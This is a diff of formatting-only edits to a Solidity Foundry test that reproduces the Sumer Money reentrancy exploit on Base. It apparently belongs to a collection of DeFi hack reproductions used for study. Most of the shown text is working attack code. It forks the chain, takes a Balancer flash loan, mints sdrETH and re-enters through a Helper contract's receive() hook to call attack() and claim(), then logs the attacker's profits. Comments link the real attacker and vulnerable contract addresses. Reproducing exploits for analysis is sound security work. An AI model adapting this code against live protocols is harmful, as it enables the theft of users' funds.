@@ -8,22 +8,22 @@ import "./interface.sol";
 // Attacker : /address/https://basescan.org/address/0xbb344544ad328b5492397e967fe81737855e7e77
 // Attack Contract : /address/https://basescan.org/address/0x13d27a2d66ea33a4bc581d5fefb0b2a8defe9fe7
 // Vulnerable Contract : /address/https://basescan.org/address/0x23811c17bac40500decd5fb92d4feb972ae1e607
-// Attack Tx : /tx/https://basescan.org/tx/0x619c44af9fedb8f5feea2dcae1da94b6d7e5e0e7f4f4a99352b6c4f5e43a4661 
+// Attack Tx : /tx/https://basescan.org/tx/0x619c44af9fedb8f5feea2dcae1da94b6d7e5e0e7f4f4a99352b6c4f5e43a4661
 
 // @Info
 // Vulnerable Contract Code : /address/https://basescan.org/address/0x23811c17bac40500decd5fb92d4feb972ae1e607#code
 
 // @Analysis
-// Post-mortem : 
+// Post-mortem :
 // Twitter Guy : https://twitter.com/0xNickLFranklin/status/1778986926705672698
-// Hacking God : 
+// Hacking God :
 
 interface IClaimer {
     function claim(uint256[] calldata tokenIds) external;
 }
 
 contract SumerMoney is Test {
-    uint256 blocknumToForkFrom = 13076768;
+    uint256 blocknumToForkFrom = 13_076_768;
 
     IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IWETH WETH = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
@@ -36,7 +36,6 @@ contract SumerMoney is Test {
     Helper helper;
 
     function setUp() public {
-
         vm.createSelectFork("Base", blocknumToForkFrom);
     }
 
@@ -50,7 +49,6 @@ contract SumerMoney is Test {
         amounts[1] = 645_000 * 1e6;
         bytes memory userData = "";
         Balancer.flashLoan(address(this), tokens, amounts, userData);
-        
 
         emit log_named_decimal_uint("Attacker USDC Balance After exploit", USDC.balanceOf(address(this)), 6);
         emit log_named_decimal_uint("Attacker cbETH Balance After exploit", cbETH.balanceOf(address(this)), 18);
@@ -64,7 +62,7 @@ contract SumerMoney is Test {
     ) external {
         WETH.withdraw(amounts[0]);
 
-        // sdrETH.exchangeRate 
+        // sdrETH.exchangeRate
         emit log_named_decimal_uint("Before re-enter, sdrETH exchangeRate", sdrETH.exchangeRateCurrent(), 18);
 
         sdrETH.mint{value: amounts[0]}();
@@ -76,7 +74,6 @@ contract SumerMoney is Test {
         WETH.deposit{value: amounts[0]}();
         WETH.transfer(address(Balancer), amounts[0]);
         USDC.transfer(address(Balancer), amounts[1]);
-
     }
 
     function attack() external {
@@ -90,13 +87,13 @@ contract SumerMoney is Test {
         uint256[] memory tokenIds = new uint256[](2);
         tokenIds[0] = 309;
         tokenIds[1] = 310;
-        claimer.claim(tokenIds);    
+        claimer.claim(tokenIds);
     }
+
     receive() external payable {}
 }
 
 contract Helper {
-    
     address owner;
     IWETH WETH = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
     IERC20 USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
@@ -106,7 +103,7 @@ contract Helper {
     ICErc20Delegate sdrcbETH = ICErc20Delegate(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);
     IClaimer claimer = IClaimer(0x549D0CdC753601fbE29f9DE186868429a8558E07);
 
-    constructor() payable{
+    constructor() payable {
         owner = msg.sender;
     }
 
@@ -127,9 +124,8 @@ contract Helper {
     }
 
     receive() external payable {
-        if(msg.value == 1){
+        if (msg.value == 1) {
             owner.call(abi.encodeWithSignature("attack()"));
         }
     }
 }
-
